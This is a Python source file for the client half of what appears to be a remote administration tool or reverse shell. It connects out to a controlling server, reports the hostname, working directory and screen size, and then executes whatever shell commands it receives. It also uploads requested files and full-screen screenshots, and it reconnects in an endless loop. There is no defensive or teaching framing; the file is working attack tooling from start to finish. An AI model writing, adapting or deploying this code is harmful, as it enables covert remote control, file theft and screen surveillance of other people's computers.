import os
import socket
import subprocess
import time
import signal
import sys
import struct
from mss import mss

class Client(object):

    def __init__(self):
        # self.serverHost = '192.168.1.9'
        self.serverHost = 'localhost'
        self.serverPort = 9999
        self.socket = None

    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit_gracefully)
        signal.signal(signal.SIGTERM, self.quit_gracefully)
        return

    def quit_gracefully(self, signal=None, frame=None):
        print('\nQuitting gracefully')
        if self.socket:
            try:
                self.socket.shutdown(2)
                self.socket.close()
            except Exception as e:
                print('Could not close connection %s' % str(e))
                # continue
        sys.exit(0)
        return

    def socket_create(self):
        """ Create a socket """
        try:
            self.socket = socket.socket()
        except socket.error as e:
            print("Socket creation error" + str(e))
            return
        return

    def socket_connect(self):
        """ Connect to a remote socket """
        try:
            self.socket.connect((self.serverHost, self.serverPort))
        except socket.error as e:
            print("Socket connection error: " + str(e))
            time.sleep(5)
            raise
        try:
            self.socket.send(str.encode(socket.gethostname()))
        except socket.error as e:
            print("Cannot send hostname to server: " + str(e))
            raise
        return

    def print_output(self, output):
        """ Prints command output """
        try:
            sent_message = str.encode(output + "$-?" + str(os.getcwd()) + '> ')
            self.socket.send(struct.pack('>I', len(sent_message)) + sent_message)
        except:
            self.socket.send(struct.pack('>I', len(output)) + output)
        #print(output)
        return

    def get_file(self, filename):
        fn = filename
        try:
            file = str(os.getcwd()) + fn
            with open(file, 'rb') as f:
                data = f.read()
                print(data)
                #data = bytearray(data)
                output = data
        except Exception as e:
            output = "Could not find file: %s\n" % str(e)
        return output

    def get_sc(self):
        print('Taking snapshot')
        with mss() as sct: #SELF???
            #monitor = {'width': 1366, 'left': 0, 'top': 0, 'height': 768}
            #monitor = {'top': 0, 'left': 0, 'width': 200, 'height': 150}

            output = sct.grab(sct.monitors[1])
            print(output.rgb)
            print('Turning snapshot into bytes')
            #size = bytes(output.size)
            print(output.size)
        return output.rgb
        #return output
                             
    def get_mon_size(self):
        with mss() as sct:
            monitor = sct.monitors[1]
            width = monitor['width']
            height = monitor['height']
            #STringify all
            monitor = str(width) + ' ' + str(height)
        return monitor

    def change_dir(self, dir):
        directory = dir
        try:
            os.chdir(directory.strip())
        except Exception as e:
            output = "Could not change directory: %s\n" % str(e)
        else:
            output = ""
        return output

    def receive_commands(self):
        """ Receive commands from remote server and run on local machine """
        try: #PING IF LIVE
            self.socket.recv(10)
        except Exception as e:
            print('Could not start communication with server: %s\n' %str(e))
            return
        
        #Send valuable data to host
        #CWD
        cwd = str.encode(str(os.getcwd()) + '> ')
        self.socket.send(struct.pack('>I', len(cwd)) + cwd)
        #Monitor size
        mon_size = self.get_mon_size()
        mon_size_bytes = str.encode(mon_size)
        self.socket.send(struct.pack('>I', len(mon_size_bytes)) + mon_size_bytes)

        #Recieve commands
        while True:
            output = None
            #xtra_output = None
            data = self.socket.recv(20480)
            if data == b'': break
            elif data[:2].decode("utf-8") == 'cd':
                directory = data[3:].decode("utf-8")
                output = self.change_dir(directory)

            elif data[:].decode("utf-8") == 'quit':
                self.socket.close()
                break

            elif data[:3].decode("utf-8") == 'get':
                filename = data[4:].decode("utf-8")
                output = self.get_file(filename)


            elif data[:2].decode("utf-8") == 'sc':
                output = self.get_sc()
                #output = self.get_mon_size()
                #xtra_output = size  # is sent after output

            elif data[:].decode('utf-8') == 'dir':
                continue #had errors...
            
            elif data[:].decode('utf-8') == 'ls':
                dirlist = os.listdir(os.curdir)
                dirstring = ''
                for f in dirlist:
                    dirstring += f + '\n'
                output = dirstring

            elif len(data) > 0:
                try:
                    cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
                    output = output_bytes.decode("utf-8", errors="replace")
                    print(output)
                except Exception as e:
                    # TODO: Error description is lost
                    output = "Command execution unsuccessful: %s\n" %str(e)
            if output is not None:
                try:
                    self.print_output(output)
                except Exception as e:
                    print('Cannot send command output: %s' %str(e))
        self.socket.close()
        return

def main():
    client = Client()
    client.register_signal_handler()
    client.socket_create()
    while True:
        try:
            client.socket_connect()
        except Exception as e:
            print("Error on socket connections: %s" %str(e))
            time.sleep(5)
        else:
            break
    try:
        client.receive_commands()
    except Exception as e:
        print('Error in main: ' + str(e))
    client.socket.close()
    return


if __name__ == '__main__':
    while True:
        main()
